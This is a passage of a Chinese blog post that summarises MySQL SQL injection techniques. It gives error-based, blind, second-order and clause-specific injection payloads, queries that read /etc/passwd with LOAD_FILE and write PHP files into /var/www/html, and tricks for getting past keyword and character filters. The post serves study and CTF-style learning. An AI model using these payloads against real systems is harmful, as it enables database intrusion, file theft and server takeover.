class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(要查询的内容),<span class="string">&#x27;~&#x27;</span>),<span class="number">3</span>);#</span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(要查询的内容),<span class="number">0x7e</span>),<span class="number">3</span>);#</span><br></pre></td></tr></table></figure></li><li><h5 id="extractvalue-报错"><a href="#extractvalue-报错" class="headerlink" title="extractvalue 报错"></a>extractvalue 报错</h5>原理同 updatexml<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(要查询的内容),<span class="number">0x7e</span>))#</span><br></pre></td></tr></table></figure></li><li><h5 id="rand-GROUP-count"><a href="#rand-GROUP-count" class="headerlink" title="rand()+GROUP()+count()"></a>rand()+GROUP()+count()</h5>原理: 由于由于<code>WHERE</code>条件每执行一次, <code>rand</code>函数就会执行一次, 在统计数据时判断依据不能动态改变, 所以<code>ORDER/GROUP BY</code>后不能接<code>rand()</code><br><code>floor(rand(0)*2)</code>是为了随机获得 0 和 1<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">GROUP</span> <span class="keyword">BY</span> concat((<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)));</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">SELECT</span> GROUP_concat(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database()),<span class="string">&#x27;~&#x27;</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">FROM</span> information_schema.tables <span class="keyword">GROUP</span> <span class="keyword">BY</span> a #</span><br></pre></td></tr></table></figure></li></ul><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>将恶意数据存储到数据库后, 被读到 SQL 语句中导致的注入,如:<br>将<code>username = &#39;admin&#39; #&#39;</code>存储到数据库中, 由于 php 中使用 <code>addslashes</code> 会给单引号转义成为 <code>admin\&#39; #</code>, 但是存入数据库时, 数据库会把 <code>\&#39;</code> 看成转义字符 变成<code>&#39;</code>来存储,所以最终存入数据库的值为 <code>admin&#39; #</code>, 执行时就变成了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;adimn&#x27;</span> #<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h2><p>使用 <code>procedure analyse</code> 注入,<br>analyse 可以有两个参数:</p><ol><li>max_elements:指定每列非重复值的最大值, 当超过这个值的时候, MySQL 不会推荐 enum 类型. （默认值 256）</li><li>max_memory （默认值 8192）analyse()为每列找出所有非重复值所采用的最大内存大小.</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#得到列的相关信息</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id <span class="keyword">desc</span> limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">#与报错注入结合,得到其他信息</span><br><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users limit <span class="number">2</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="number">1</span>,concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>);</span><br><span class="line">#写文件</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id <span class="keyword">desc</span> limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">into</span> outfile &quot;/var/www/html/1.php&quot; LINES TERMINATED <span class="keyword">BY</span> <span class="number">0x16</span>进制字符串</span><br><span class="line">#获得查询列数,有几列就几个@, 如果不一致则报错</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id <span class="keyword">desc</span> limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">into</span> @,@,@</span><br></pre></td></tr></table></figure><h2 id="update-注入"><a href="#update-注入" class="headerlink" title="update 注入"></a>update 注入</h2><p>update 注入一般使用盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#其中条件可以是任意表达式,如果条件为真,则会等待<span class="number">5</span>秒, 但是修改后的字段值还是 <span class="number">123</span></span><br><span class="line">update users <span class="keyword">set</span> password<span class="operator">=</span><span class="string">&#x27;123&#x27;</span><span class="operator">|</span>if(条件,sellp(<span class="number">5</span>), <span class="number">1</span>) <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">14</span>;</span><br><span class="line">#如果表达式为真则会将字段名修改为 <span class="number">1</span></span><br><span class="line">update users <span class="keyword">set</span> password <span class="operator">=</span> <span class="string">&#x27;0&#x27;</span> <span class="operator">|</span> (substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;s&#x27;</span>) <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">14</span>;</span><br></pre></td></tr></table></figure><h2 id="insert-注入"><a href="#insert-注入" class="headerlink" title="insert 注入"></a>insert 注入</h2><p>原理同 update 注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#其中条件可以是任意表达式,如果条件为真,则会等待<span class="number">5</span>秒, 但是修改后的字段值还是 <span class="number">123</span></span><br><span class="line"><span class="keyword">insert</span> users <span class="keyword">value</span> (<span class="number">14</span>, &quot;CSHF&quot;, &quot;0&quot;<span class="operator">|</span>if(条件,sellp(<span class="number">5</span>), <span class="number">1</span>));</span><br><span class="line">#如果表达式为真则会将字段名修改为 <span class="number">1</span></span><br><span class="line"><span class="keyword">insert</span> users <span class="keyword">value</span> (<span class="number">14</span>, &quot;CSHF&quot;, &quot;0&quot;<span class="operator">|</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;s&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="ORDER-BY-注入"><a href="#ORDER-BY-注入" class="headerlink" title="ORDER BY 注入"></a>ORDER BY 注入</h2><p>使用报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(要查询的内容),<span class="string">&#x27;~&#x27;</span>),<span class="number">3</span>);#</span><br></pre></td></tr></table></figure><h2 id="GROUP-BY-注入"><a href="#GROUP-BY-注入" class="headerlink" title="GROUP BY 注入"></a>GROUP BY 注入</h2><p>也相当于是 bool 盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="keyword">having</span> substr((<span class="keyword">SELECT</span> database()),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="string">&#x27;z&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><ul><li>读文件</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="number">0x2f6574632f706173737764</span>)</span><br><span class="line">load data infile &quot;/etc/passwd&quot; <span class="keyword">into</span> <span class="keyword">table</span> test FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span>; #读取服务端文件</span><br><span class="line">load data <span class="keyword">local</span> infile &quot;/etc/passwd&quot; <span class="keyword">into</span> <span class="keyword">table</span> test FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span>; #读取客户端文件</span><br></pre></td></tr></table></figure><ul><li>写文件</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/1.php&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> version() <span class="keyword">into</span> outfile &quot;/var/www/html/test.php&quot; LINES TERMINATED <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span> # 这里写<span class="number">16</span>进制的字符串</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="无列名盲注"><a href="#无列名盲注" class="headerlink" title="无列名盲注"></a>无列名盲注</h2><p>子查询可以使用 <code>&gt;</code>, <code>=</code>, <code>&lt;</code> 来进行比较<br>一般结合bool盲注使用, 注: 对字母的大小写不敏感, 也就是说 <code>&#39;a&#39; = &#39;A&#39;</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h1><h2 id="and-或-or-被过滤-拦截"><a href="#and-或-or-被过滤-拦截" class="headerlink" title="and 或 or 被过滤/拦截"></a>and 或 or 被过滤/拦截</h2><ul><li>双写 <code>aandnd</code>、<code>oorr</code></li><li><code>&amp;&amp;</code> 等于 <code>and</code>, <code>||</code> 等于 <code>or</code></li><li>拼接等号<code>=</code>, 如: <code>id=1=(表达式)</code></li><li>使用异或号 <code>xor</code>,<code>^</code>, 如 <code>id=1^(表达式)</code>, <code>id=(1)xor(表达式)</code></li></ul><h2 id="结果中的关键字被过滤"><a href="#结果中的关键字被过滤" class="headerlink" title="结果中的关键字被过滤"></a>结果中的关键字被过滤</h2><ul><li>使用 <code>replace(group_concat(username),&#39;flag&#39;,&#39;galf&#39;)</code></li></ul><h2 id="空格被过滤-拦截"><a href="#空格被过滤-拦截" class="headerlink" title="空格被过滤/拦截"></a>空格被过滤/拦截</h2><ul><li>使用括号嵌套</li><li>用注释<code>/**/</code>, <code>/*! */</code>代替空格</li><li>使用 <code>+</code> 代替空格</li><li>使用不可见字符代替空格, 如 <code>%09 %0a %0b %0c %0d %a0</code> 等</li><li><code>and/or</code>前的空格可省略, <code>and/or</code>后面可用跟上偶数个<code>!</code> 或<code>~</code>来代替空格</li><li>例: <code>SELECT/**/*/*!*/FROM/**/users/**/WHERE+id =1/**/or!!~~1</code></li></ul><h2 id="单双引号"><a href="#单双引号" class="headerlink" title="单双引号"></a>单双引号</h2><ul><li>如果需要闭合单双引号, 尝试是否存在编码问题,通过编码来闭合 或者是否存在二次注入来闭合引号</li><li>如果不需要闭合引号, 可以使用字符串的 16 进制表示一个字符串, 也可以通过 <code>char</code> 或 <code>concat</code>与<code>chr</code>组合 来合成字符串,或使用进制转换函数表示成其他进制<br>例: <code>SELECT * FROM users WHERE username = 0x44756d62</code></li></ul><h2 id="逗号被过滤"><a href="#逗号被过滤" class="headerlink" title="逗号被过滤"></a>逗号被过滤</h2><ul><li><code>substr</code> 与 <code>limit</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(data <span class="keyword">FROM</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>) # substr(data, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">limit <span class="number">9</span> <span class="keyword">offset</span> <span class="number">4</span> # limit <span class="number">9</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure><ul><li>使用 <code>join</code> 注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ((<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> <span class="keyword">user</span>)a <span class="keyword">join</span> (<span class="keyword">SELECT</span> name <span class="keyword">FROM</span> <span class="keyword">user</span>)b <span class="keyword">join</span> (<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> <span class="keyword">user</span>)c)` 等价于 `<span class="keyword">SELECT</span> id,name,password <span class="keyword">FROM</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure><h2 id="等号或-like-被过滤"><a href="#等号或-like-被过滤" class="headerlink" title="等号或 like 被过滤"></a>等号或 like 被过滤</h2><ul><li>使用 正则表达式<code>REGEXP</code> 或 <code>in</code></li><li><code>!=</code> 和 <code>&lt;&gt;</code> 都是不等于</li></ul><h2 id="if-被过滤"><a href="#if-被过滤" class="headerlink" title="if 被过滤"></a>if 被过滤</h2><ul><li><code>case when condition then 1 else 0 end</code></li></ul><h2 id="union被过滤"><a href="#union被过滤" class="headerlink" title="union被过滤"></a>union被过滤</h2><ul><li><code>使用/*!union*/可以绕过对union的过滤</code></li></ul><h2 id="数字被过滤"><a href="#数字被过滤" class="headerlink" title="数字被过滤"></a>数字被过滤</h2><div class="table-overflow"><table><thead><tr><th align="left">代替字符</th><th align="left">对应的数</th><th align="left">对应的字符</th></tr></thead><tbody><tr><td align="left">false</td><td align="left">0</td><td align="left">无</td></tr><tr><td align="left">!pi()</td><td align="left">0</td><td align="left">无</td></tr><tr><td align="left">true</td><td align="left">1</td><td align="left">无</td></tr><tr><td align="left">!!pi()</td><td align="left">1</td><td align="left">无</td></tr><tr><td align="left">true+true</td><td align="left">2</td><td align="left">无</td></tr><tr><td align="left">floor(pi())</td><td align="left">3</td><td align="left">无</td></tr><tr><td align="left">ceil(pi())</td><td align="left">4</td><td align="left">无</td></tr><tr><td align="left">floor(version())</td><td align="left">5</td><td align="left">无</td></tr><tr><td align="left">ceil(version())</td><td align="left">6</td><td align="left">无</td></tr><tr><td align="left">ceil(pi()+pi())</td><td align="left">7</td><td align="left">无</td></tr><tr><td align="left">floor(version()+pi())</td><td align="left">8</td><td align="left">无</td></tr><tr><td align="left">floor(pi()*pi())</td><td align="left">9</td><td align="left">无</td></tr><tr><td align="left">ceil(pi()*pi())</td><td align="left">10</td><td align="left">A</td></tr><tr><td align="left">ceil(pi()*pi())+true</td><td align="left">11</td><td align="left">B</td></tr><tr><td align="left">ceil(pi()+pi()+version())</td><td align="left">12</td><td align="left">C</td></tr><tr><td align="left">floor(pi()*pi()+pi())</td><td align="left">13</td><td align="left">D</td></tr><tr><td align="left">ceil(pi()*pi()+pi())</td><td align="left">14</td><td align="left">E</td></tr><tr><td align="left">ceil(pi()*pi()+version())</td><td align="left">15</td><td align="left">F</td></tr><tr><td align="left">floor(pi()*version())</td><td align="left">16</td><td align="left">G</td></tr><tr><td align="left">ceil(pi()*version())</td><td align="left">17</td><td align="left">H</td></tr><tr><td align="left">ceil(pi()*version())+true</td><td align="left">18</td><td align="left">I</td></tr><tr><td align="left">floor((pi()+pi())*pi())</td><td align="left">19</td><td align="left">J</td></tr><tr><td align="left">ceil((pi()+pi())*pi())</td><td align="left">20</td><td align="left">K</td></tr><tr><td align="left">ceil(ceil(pi())*version())</td><td align="left">21</td><td align="left">L</td></tr><tr><td align="left">ceil(pi()*ceil(pi()+pi()))</td><td align="left">22</td><td align="left">M</td></tr><tr><td align="left">ceil((pi()+ceil(pi()))*pi())</td><td align="left">23</td><td align="left">N</td></tr><tr><td align="left">ceil(pi())*ceil(version())</td><td align="left">24</td><td align="left">O</td></tr><tr><td align="left">floor(pi()*(version()+pi()))</td><td align="left">25</td><td align="left">P</td></tr><tr><td align="left">floor(version()*version())</td><td align="left">26</td><td align="left">Q</td></tr><tr><td align="left">ceil(version()*version())</td><td align="left">27</td><td align="left">R</td></tr><tr><td align="left">ceil(pi()*pi()*pi()-pi())</td><td align="left">28</td><td align="left">S</td></tr><tr><td align="left">floor(pi()*pi()*floor(pi()))</td><td align="left">29</td><td align="left">T</td></tr></tbody></table></div><h2 id="HANDLER-语句代替SELECT查询"><a href="#HANDLER-语句代替SELECT查询" class="headerlink" title="HANDLER 语句代替SELECT查询"></a>HANDLER 语句代替SELECT查询</h2><p>语法如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure><hr><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="Mysql的基本操作"><a href="#Mysql的基本操作" class="headerlink" title="Mysql的基本操作"></a>Mysql的基本操作</h2><ol><li>修改表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test_a rename <span class="keyword">to</span> sys_app;</span><br><span class="line">retable <span class="keyword">table</span> test_a <span class="keyword">to</span> sys_app;</span><br></pre></td></tr></table></figure></li><li>修改表注释<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> sys_application comment <span class="string">&#x27;系统信息表&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li>修改字段类型和注释<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> sys_application modify <span class="keyword">column</span> app_name <span class="type">varchar</span>(<span class="number">20</span>) COMMENT <span class="string">&#x27;应用的名称&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li>修改字段类型<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> sys_application modify <span class="keyword">column</span> app_name text;</span><br></pre></td></tr></table></figure></li><li>设置字段允许为空<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> sys_application modify <span class="keyword">column</span> description <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">null</span> COMMENT <span class="string">&#x27;应用描述&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li>增加一个字段，设好数据类型，且不为空，添加注释<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert <span class="keyword">table</span> sys_application <span class="keyword">add</span> `url` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;应用访问地址&#x27;</span>; </span><br></pre></td></tr></table></figure></li><li>增加主键　　<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> t_app <span class="keyword">add</span> aid <span class="type">int</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span> ,<span class="keyword">add</span> <span class="keyword">primary</span> key (aid); </span><br></pre></td></tr></table></figure></li><li>增加自增主键　<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> t_app <span class="keyword">add</span> aid <span class="type">int</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span> auto_increment ,<span class="keyword">add</span> <span class="keyword">primary</span> key (aid); </span><br></pre></td></tr></table></figure></li><li>修改为自增主键<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> t_app modify <span class="keyword">column</span> aid <span class="type">int</span>(<span class="number">5</span>) auto_increment ;</span><br></pre></td></tr></table></figure></li><li>修改字段名字(要重新指定该字段的类型)<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> t_app change name app_name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure></li><li>删除字段　　<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> t_app <span class="keyword">drop</span> aid; </span><br></pre></td></tr></table></figure></li><li>在某个字段后增加字段<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> `t_app` <span class="keyword">add</span> <span class="keyword">column</span> gateway_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="number">0</span> AFTER `aid`； #(在哪个字段后面添加) </span><br></pre></td></tr></table></figure></li><li>调整字段顺序　<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> t_app change gateway_id gateway_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> after aid ; #(注意gateway_id出现了<span class="number">2</span>次)</span><br></pre></td></tr></table></figure></li></ol><h2 id="Sqlmap的使用"><a href="#Sqlmap的使用" class="headerlink" title="Sqlmap的使用"></a>Sqlmap的使用</h2><p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap用法</a></p><h2 id="SQL-fuzz-字典"><a href="#SQL-fuzz-字典" class="headerlink" title="SQL fuzz 字典"></a>SQL fuzz 字典</h2><p><a target="_blank" rel="noopener" href="https://github.com/CSHF-yhhhh/ShareFile/blob/main/WEB/SQL/sql%E6%B3%A8%E5%85%A5fuzz%E5%AD%97%E5%85%B8.txt">sql_fuzz)dict</a></p><hr><p>欢迎大家在评论区补充未提到的方法</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><ol><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169#toc-37">对MYSQL注入相关内容及部分Trick的归类小结</a></li></ol></blockquote></div><div class="article-licensing box"><div class="licensing-title"><p>SQL注入总结(MySQL)</p><p><a href="http://blog.cshf.xyz/2021/05/16/SQL_Inject/">http://blog.cshf.xyz/2021/05/16/SQL_Inject/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>CSHF</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-05-16</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-06-08</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/SQL/">SQL</a></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><div class="social-share"></div><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechat.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/05/27/A-Simple-Packet-Filtering-Firewall-in-Linux/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">A Simple Packet Filtering Firewall in Linux(Linux下的包过滤防火墙)</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/05/04/PE_FILE/"><span class="level-item">PE文件</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="SOHUCS" sid="2021/05/16/SQL_Inject/"></div><script charset="utf-8" src="https://changyan.sohu.com/upload/changyan.js"></script><script>window.changyan.api.config({appid:"cyvriV1fa",conf:"prod_f55e4468ceec84bbe9b19714e1877a4c"})</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/touxiang.png" alt="CSHF"></figure><p class="title is-size-4 is-block" style="line-height:inherit">CSHF</p><p class="is-size-6 is-block">Enjoy Studying!</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">12</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/CSHF-yhhhh" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/CSHF-yhhhh"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="MyWebsite" href="http://www.cshf.xyz"><i class="fab fa-gratipay"></i></a></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Application/"><span class="level-start"><span class="level-item">Application</span></span><span class="level-end"><span class="level-item tag">1</span></span></a><ul><li><a class="level is-mobile" href="/categories/Application/Kivy/"><span class="level-start"><span class="level-item">Kivy</span></span><span 